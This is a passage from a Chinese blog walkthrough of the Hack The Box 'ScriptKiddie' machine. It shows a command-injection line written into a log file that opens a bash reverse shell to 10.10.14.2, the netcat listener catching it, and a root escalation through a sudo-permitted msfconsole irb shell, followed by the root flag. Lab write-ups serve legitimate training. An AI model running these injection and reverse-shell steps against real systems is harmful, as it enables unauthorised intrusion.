+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kid@scriptkiddie:~/html$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;x x x 127.0.0.1; bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/10086 0&gt;&amp;1&#x27; # .&quot;</span>  &gt; /home/kid/logs/hackers<br>&lt;.10.14.2/10086 0&gt;&amp;1<span class="hljs-string">&#x27; # .&quot;  &gt; /home/kid/logs/hackers</span><br><span class="hljs-string">kid@scriptkiddie:~/html$</span><br></code></pre></td></tr></table></figure>
+
+<p>15、至此成功监听获取到pwn权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 57008<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (868): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>pwn@scriptkiddie:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(pwn) gid=1001(pwn) <span class="hljs-built_in">groups</span>=1001(pwn)<br>pwn@scriptkiddie:~$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> pwn on scriptkiddie:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User pwn may run the following commands on scriptkiddie:<br>    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole<br>pwn@scriptkiddie:~$<br></code></pre></td></tr></table></figure>
+
+<p>16、这里发现，我们可以root权限运营msf，那就直接提权完事</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole<br>sudo /opt/metasploit-framework-6.0.9/msfconsole<br>                                                  <br><br>         .                                         .<br> .<br><br>      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o<br>       <span class="hljs-string">&#x27;   dB&#x27;</span>                     BBP<br>    dB<span class="hljs-string">&#x27;dB&#x27;</span>dB<span class="hljs-string">&#x27; dBBP     dBP     dBP BB</span><br><span class="hljs-string">   dB&#x27;</span>dB<span class="hljs-string">&#x27;dB&#x27;</span> dBP      dBP     dBP  BB<br>  dB<span class="hljs-string">&#x27;dB&#x27;</span>dB<span class="hljs-string">&#x27; dBBBBP   dBP     dBBBBBBB</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span><br><span class="hljs-string">          .                  .                  dB&#x27;</span> dBP    dB<span class="hljs-string">&#x27;.BP</span><br><span class="hljs-string">                             |       dBP    dBBBB&#x27;</span> dBP    dB<span class="hljs-string">&#x27;.BP dBP    dBP</span><br><span class="hljs-string">                           --o--    dBP    dBP    dBP    dB&#x27;</span>.BP dBP    dBP<br>                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP<br><br>                                                                    .<br>                .<br>        o                  To boldly go <span class="hljs-built_in">where</span> no<br>                            shell has gone before<br><br><br>       =[ metasploit v6.0.9-dev                           ]<br>+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]<br>+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]<br>+ -- --=[ 7 evasion                                       ]<br><br>Metasploit tip: Save the current environment with the save <span class="hljs-built_in">command</span>, future console restarts will use this environment again<br><br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>msf6 &gt; irb<br><span class="hljs-built_in">stty</span>: <span class="hljs-string">&#x27;standard input&#x27;</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>[*] Starting IRB shell...<br>[*] You are <span class="hljs-keyword">in</span> the <span class="hljs-string">&quot;framework&quot;</span> object<br><br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>Switch to inspect mode.<br>irb: warn: can<span class="hljs-string">&#x27;t alias jobs from irb_jobs.</span><br><span class="hljs-string">&gt;&gt; </span><br><span class="hljs-string">&gt;&gt; system(&quot;/bin/bash&quot;)</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="hljs-string">cat /root/root.txt</span><br><span class="hljs-string">e87e72d245999bb267a776496513cf29</span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/314</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ScriptKiddie-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/23/ScriptKiddie-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/24/Armageddon-htb-writeup/" title="Armageddon-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Armageddon-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/22/Luanne-htb-writeup/" title="Luanne-htb-writeup">
+                        <span class="hidden-mobile">Luanne-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
